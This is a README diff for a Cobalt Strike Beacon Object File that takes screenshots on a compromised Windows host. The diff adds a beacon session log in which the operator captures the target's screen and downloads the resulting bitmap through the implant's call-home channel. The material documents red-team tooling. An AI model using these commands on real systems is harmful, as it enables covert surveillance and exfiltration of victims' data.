@@ -5,9 +5,22 @@ An alternative screenshot capability for Cobalt Strike that uses WinAPI and does
 ## Usage
 1. import the screenshotBOF.cna script into Cobalt Strike
 2. use the command screenshot_bof
-3. Download the screenshot from the target e.g.
+3. Download the screenshot from the target
 ```
-download screenshot.bmp
+beacon> screenshot_bof
+[*] Running screenshot BOF by (@codex_tf2)
+[+] host called home, sent: 3411 bytes
+[+] received output:
+[*] Tasked beacon to printscreen and save to disk
+[+] received output:
+[+] PrintScreen saved to bitmap...
+[+] received output:
+[+] Printscreen bitmap saved to screenshot.bmp
+beacon> download screenshot.bmp
+[*] Tasked beacon to download screenshot.bmp
+[+] host called home, sent: 22 bytes
+[*] started download of C:\screenshot.bmp (12441668 bytes)
+[*] download of screenshot.bmp is complete
 ```
 
 ## Notes
